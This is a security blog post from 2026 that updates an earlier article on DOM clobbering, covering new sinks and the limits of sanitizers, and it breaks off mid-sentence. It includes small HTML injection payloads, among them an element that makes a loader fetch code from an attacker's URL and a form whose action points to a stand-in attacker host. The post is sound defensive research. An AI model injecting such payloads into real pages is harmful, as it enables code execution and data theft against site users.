---
title: DOM Clobbering Five Years On - New Sinks, New Bypasses, and Why Sanitizers Still Miss Them
url: https://blog.zeddyu.info/2026/05/04/Dom-Clobbering-Five-Years-On/
source: ZeddYu’s Blog
date: 2026-05-04
fetch_date: 2026-05-05T05:03:28.547033
---

# DOM Clobbering Five Years On - New Sinks, New Bypasses, and Why Sanitizers Still Miss Them

* [Skip to primary navigation](#site-nav)
* [Skip to content](#main)
* [Skip to footer](#footer)

[ZeddYu's Blog](/)

Toggle menu

### [ZeddYu](https://blog.zeddyu.info/)

Security Researcher. HTTP Smuggling, Web Security, CTF.

Follow

# [DOM Clobbering Five Years On - New Sinks, New Bypasses, and Why Sanitizers Still Miss Them](https://blog.zeddyu.info/2026/05/04/Dom-Clobbering-Five-Years-On/)

10 minute read

#### On this page

* [What aged well from the 2020 post](#what-aged-well-from-the-2020-post)
* [What has aged badly](#what-has-aged-badly)
* [Three sink classes worth knowing in 2026](#three-sink-classes-worth-knowing-in-2026)
  + [Sink 1: document.currentScript](#sink-1-documentcurrentscript)
  + [Sink 2: custom-element registry interactions](#sink-2-custom-element-registry-interactions)
  + [Sink 3: form action and base-target clobbering](#sink-3-form-action-and-base-target-clobbering)
* [A current-state DOMPurify bypass walk-through](#a-current-state-dompurify-bypass-walk-through)
* [Trusted Types and the Sanitizer API](#trusted-types-and-the-sanitizer-api)
* [Detection patterns that still work](#detection-patterns-that-still-work)
* [Mitigation update](#mitigation-update)
* [Why this kept being interesting](#why-this-kept-being-interesting)
* [References](#references)

In March 2020 I published [DOM Clobbering - An Underestimated Attack Vector](/2020/03/04/Dom-Clobbering/), a brief introduction to clobbering as an HTML-injection-to-script-execution path. The framing held up better than I expected. The specific examples did not. Five years of sanitizer hardening, two browser-side mitigation primitives shipped to production, and a body of academic and offensive research I will not try to summarise in one paragraph have changed both what the attack looks like and what the defenderâs actual options are.

This post is the 2026 follow-up. I revisit the original claims, identify which ones aged well and which did not, and walk through the new sinks and bypass classes the community has documented since 2020. As before, my goal is not a comprehensive survey. It is to give a practitioner a working mental model of where DOM Clobbering currently sits in 2026 and where the live attack surface is.

## What aged well from the 2020 post

Three things from the 2020 post still hold:

1. **The fundamental primitive is unchanged.** When an HTML element with `id` or `name` is parsed into a document, the browser exposes it as a named property on `document` (and conditionally on `window`) per the [HTML Living Standardâs named-access rules](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object). This has not been spec-revised since 2020, and proposals to deprecate the behaviour have not advanced. If you can inject HTML into a page that runs JavaScript, you have a clobbering surface.
2. **The HTMLCollection chaining trick still works.** A `<form id="config"><input name="apiUrl">` still resolves `document.config.apiUrl` to the input element, and the `value` attribute of that input is still attacker-controlled. Browsers have not introduced a separation between named-access on document and named-access via HTMLCollection. They are coupled at the spec level.
3. **CSP is not a mitigation.** A strict `script-src` policy that blocks inline scripts and `eval` does not block clobbering, because clobbering does not execute script. It changes the value of an existing variable that script then reads. The 2020 post called this out and the gap is still there in 2026, in some respects worse, because newer applications often treat strict CSP as the answer and skip other defences.

## What has aged badly

Three things I wrote in 2020 are now misleading or incomplete:

1. **âModern versions of DOMPurify have addressed known clobbering vectors.â** This was true in 2020 in a narrow sense and has remained true for the specific bypasses known then. What I did not anticipate was the steady cadence of new clobbering bypasses against DOMPurify in the years since. The [DOMPurify security advisories list](https://github.com/cure53/DOMPurify/security/advisories) has been the most reliable place to track this. Several of the 2022-2025 advisories are clobbering-shaped: an attacker injects an element configuration that DOMPurify processes, but that breaks an assumption in DOMPurifyâs own internal lookup chain. The library has hardened, but the underlying interaction between sanitizer code and the document namespace it operates on is genuinely difficult to make airtight.
2. **The mitigation list I gave was incomplete.** `Object.freeze`, `const` declarations, type checks, and `SANITIZE_DOM: true` are still recommended, but the 2020 list missed two things that became relevant after that date: Trusted Types (Chromium-shipped, widely adopted in Google production) and the proposed Sanitizer API. Both materially change the picture in 2026.
3. **The attack-surface description was too narrow.** I treated clobbering primarily as a `window.config` / `document.someLib` pollution surface. The community has since identified at least three additional sink classes that I did not cover: `document.currentScript` clobbering, custom-element-registry interactions, and form-action clobbering used as a redirect primitive. These are described below.

## Three sink classes worth knowing in 2026

### Sink 1: document.currentScript

`document.currentScript` returns the `<script>` element that is currently executing. Several library loaders use this to discover their own URL, then derive paths to sibling resources. The pattern is something like:

```
var base = document.currentScript.src.split('/').slice(0,-1).join('/');
loadModule(base + '/plugin.js');
```

If the page in which the script runs has been clobbered with `<img name="currentScript">` before the loader script runs, `document.currentScript` resolves to the `<img>` element rather than the executing script. The `src` attribute on the image is attacker-controlled. The loader fetches a sibling path of the attackerâs URL and executes whatever the attacker hosts there.

The condition for this is that the named element must come before the loader script in document order, and the property has to be unset at the time the lookup happens. In practice the second condition is met more often than you would expect, because not all script types repopulate `currentScript` reliably across browsers. This sink was not in the 2020 post and it is one of the higher-impact ones in modern apps.

### Sink 2: custom-element registry interactions

The Custom Elements API exposes a registry on `window.customElements`. This registry itself is not directly clobberable, but the lookups around it sometimes are. A pattern I have seen in two real codebases:

```
if (!window.MyComponent) {
  customElements.define('my-component', MyComponent);
}
```

The intent is to avoid double-registration. The check is on `window.MyComponent`, which the developer assumed referred to a class definition that may or may not have been imported. An attacker who can inject `<a id="MyComponent">` makes the check pass, the `define` call is skipped, and the component is never registered. In an application that loads logic conditionally based on registered components, this becomes a denial-of-feature primitive at minimum, and in some applications a privilege-escalation primitive when the unregistered component would have applied a security boundary.

This is a narrower sink than the loader case but shows up in framework-style codebases that mix imperative custom-element registration with global-flag checks.

### Sink 3: form action and base-target clobbering

This is older than the 2020 post but I did not cover it. Two forms here:

* `<form id="x" action="https://attacker.example/">` makes `document.x.action` a string the attacker controls. Code that reads `document.x.action` (some framework code does, particularly form-handling helpers) treats it as the attackerâ...